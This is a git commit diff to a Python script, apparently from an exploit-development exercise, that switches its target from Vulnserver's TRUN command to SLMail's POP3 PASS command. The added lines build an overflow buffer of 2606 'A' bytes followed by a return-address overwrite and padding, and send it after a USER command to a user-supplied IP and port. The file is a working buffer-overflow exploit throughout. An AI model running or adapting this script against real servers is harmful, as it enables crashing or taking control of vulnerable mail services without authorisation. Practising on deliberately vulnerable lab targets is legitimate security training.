2fc7b5367190bf48008994101fd9cc8cb83b43d5
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-02-16 09:29:38 +0530

    Update executiuon-flow.py

--- executiuon-flow.py
+++ executiuon-flow.py
@@ -3,25 +3,22 @@
 import sys,socket
 from time import sleep
 
-print("**************VULNSERVER- TRUN *************")
-sleep(0.5)
-ip_address=input("ENter the IP address\n")
+
+print("*************SLMAIL POP3 vulnerability**********")
+ip_address=input("Enter the IP address\n")
 port_number=input("Enter the port number\n")
 
-if (len(ip_address)<=0) or (len(port_number)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0):
-        print("*" * 30)
+if(len(ip_address)<=0) or (len(port_number)<=0): 
+    if(len(ip_address)>0) and (len(port_number)<=0): 
         print("Port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0):
-        print("*" * 30)
+    elif(len(ip_address)<=0) and (len(port_number)>0): 
         print("IP address field is empty")
     else:
-        print("*" * 30)
         print("Issues with the user input")
-
-elif (len(ip_address)>0) and (len(port_number)>0):
-    buffer=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"C" *(2400-2003-4)
+elif(len(ip_address)>0) and (len(port_number)>0): 
+    size=b"A" * 2606 + b"\x8F\x35\x4A\x5F" + b"C" *(3100-4-2606)
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((ip_address, int(port_number)))
-    s.send((b"TRUN /.:/" + buffer))
+    s.send((b"USER TEST \r\n"))
+    s.send((b"PASS " + size + b"\r\n"))
     s.close()
